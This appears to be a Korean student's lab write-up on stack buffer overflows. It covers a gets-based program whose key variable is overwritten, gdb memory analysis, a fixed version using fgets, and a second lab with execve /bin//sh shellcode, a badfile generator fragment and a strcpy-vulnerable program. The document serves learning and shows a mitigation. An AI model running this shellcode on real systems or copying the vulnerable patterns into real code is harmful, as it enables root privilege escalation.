# Overflow

### 오버플로우의 개념을 이해하고 방지하기 위한 방법을 찾는다.

![image](https://user-images.githubusercontent.com/26988563/160322212-a79c7411-fe6a-4670-80fe-ed9efc1a6245.png)

* 오버플로우를 위해 bof.c파일을 작성해 봤다. 오버플로우를 일어나게 하기 위해 문자형 배열 overflowme[32]에 용량에 제제를 없앴다. 거기다 get 함수로는 용량을 넘어 문자열을 받을 위험이있다.

![image](https://user-images.githubusercontent.com/26988563/160322219-69ddae40-09b0-4816-86f9-1624dd2187fe.png)

* 디버깅 프로그램 gdb를 사용하여 main함수를 분석했다.

![image](https://user-images.githubusercontent.com/26988563/160322221-bca57e7c-095c-457e-9720-ad55a4721213.png)

* 마찬가지로 func함수 또한 분석해봤다. 이제 각 함수의 명령들의 주솟값을 알 수 있다.

![image](https://user-images.githubusercontent.com/26988563/160322225-49fb7d0a-223b-442c-8ad5-3b97bc93a02c.png)

* 실행을 해보면 레지스트, 코드, 스택별로 메모리 구조를 파악할 수 있다.

![image](https://user-images.githubusercontent.com/26988563/160322231-e356b1a5-24c4-40fc-9f3a-8c4718e2e8b1.png)

* 데이터를 입력했을 때, 변화를 확인하기 위해 a문자를 임의로 97개 입력해봤다. func함수에서는
	스택에 32개가 쌓이고 (+65) 중간에 8개가 쌓이고(+57) EBP에 8개가 쌓이고 메인
	으로 49개가 넘어간다. 여기서 또 알 수 있는 것은 
	EIP: (<func+37>: cmp DWORD PTR [ebp+0x8],0xcafebabe)와
	EBP: 0xbfffed18,    스택 첫 줄의 주소 0xbfffecf0이다.
	EBP주소에 8을 더하면(ebp+0x8) 0xbfffed20이니 key변수의 주소가 된다.
	따라서 스택의 주소와 키 변수의 차이는 d20-cf0 즉,
	13*16^2+2*16 - 12*16^2+15*16= 1*16^2-13*16=16*16-13*16=3*16=48이다.
  
![image](https://user-images.githubusercontent.com/26988563/160322237-1ab030d5-2f90-4243-b067-e505c4d9b8bc.png)

* 주소의 차이를 이용해 48개의 문자를 집어넣어준다. 계산대로 스택에 문자가 쌓이고
키변수에 들어갈 문자+8개의 잔여 문자들이 EBP에 들어가준다.

![image](https://user-images.githubusercontent.com/26988563/160322241-afef56a0-50d8-4cb7-8837-e51403f33b58.png)

* 오버플로우가 일어난 데이터를 직접 확인해 본 결과 0xbfffed00부터 0xbfffed20까지
61, 즉 a가 체워져있고 0xbfffed30바로 옆에 0xcafebabe가 들어간 것을 보니 
원하는 자리에 킷값과 같은 데이터가 들어간 것을 확인 할 수 있다.

![image](https://user-images.githubusercontent.com/26988563/160322247-93af2270-b68b-43fe-be2b-77b7af84c047.png)

* 작성한 bof파일을 exploit을 사용해서 오버플로우를 일으켜 루트권한을 얻었다
파이썬을 사용해 48개의 a로 버퍼를 다 체우고 킷값까지 도달해 cafebabe를
강제로 데이터에 입력한 상황이다.

![image](https://user-images.githubusercontent.com/26988563/160322252-1e808df6-af29-4534-9ce4-209a0c42f08d.png)

* bof코드를 오버플로우방지를 하기위해 고쳐준다. 오버플로우는 스택값의 범위를 넘쳐서 
다른 곳에 영향을 주는 현상이므로 우선 문자열의 크기를 32로 정해준다. 또
file get string함수를 사용하여 문자열의 크기또한 같이 받아준다.

![image](https://user-images.githubusercontent.com/26988563/160322258-1d9236c3-1f44-4872-920d-534b0b256ae8.png)

* 문제점을 보완한 bof_secure가 제대로 오버플로우를 방지하는지 확인해 본 결과
계획대로 exploit이 작동하지 않는 것을 확인할 수 있다.

  * end. 디버깅을 한다면 코드가 없어도 데이터상으로 코드를 대충 알 수 있었다. 
	다만 0xcafebabe의 경우 문자열로 표현이 불가능한 아스키코드이기 때문에
	exploit말고 직접 오버플로우를 일으킬 수 있는지 의문이 들었다.
	또 디버깅중간에 exploit을 일으켜 루트권한을 얻고 난 후에 디버깅이 계속 진행되
	지 않고 멈추는 현상을 명확하게 파악하지 못했다. 
  
### 주솟값 분석 후 쉘코드를 통한 오버플로우

![image](https://user-images.githubusercontent.com/26988563/160323107-3f4f0c2c-6e50-44c9-877a-8e06df28bed9.png)

* 첫 번째 목표는 ret주소를 알아내야한다. buf가 push되는 곳은 ebp+8 그 값을
ebp-0x20즉 40차이나는 곳으로 보내야 한다.

```
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
```

  * exploit문의 일부분이다 쉘코드가 설명과 함께 주어졌고 아무래도 목적은
쉘코드를 badfile을 통해 오버플로우 시켜서 ebx에 저장된 bin//sh를 movl를 통해 esp에
저장하면 되는 것 같다.
  
```
int bof(char *str)
{
    char buffer[24];
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);

    printf("Returned Properly\n");
    return 1;
}
```

  * badfile로 옮겨진 쉘코드 유발 exploit문을 bof함수의 strcpy를 통해 오버플로우 시켜 원하는 루트권한을 얻을 수 있다.

![image](https://user-images.githubusercontent.com/26988563/160323144-292c83f1-4ef0-403c-a1e7-8d8c653443e2.png)

* mov의 주소를 어셈블리어로 따오고 그 주소를 버퍼머리쪽에 뿌려주었다.
	그 후에 memcpy문을 이용하여 버퍼의 뒤쪽에 꽉 차게 쉘코드를 복사해주었다.
  
![image](https://user-images.githubusercontent.com/26988563/160323148-e68705a2-ead3-4e7a-8e5b-051887539b6a.png)

* mov의 주소는 ret주소값으로 시작되었고 원래는 nop의 값만큼 추측해서 malicious의 위치를 찾아야 하는 것으로 추측되지만 가이드라인을 참고, 버퍼의 마지막에 쉘코드를 붙여넣어 오버플로우를 일으켰다.



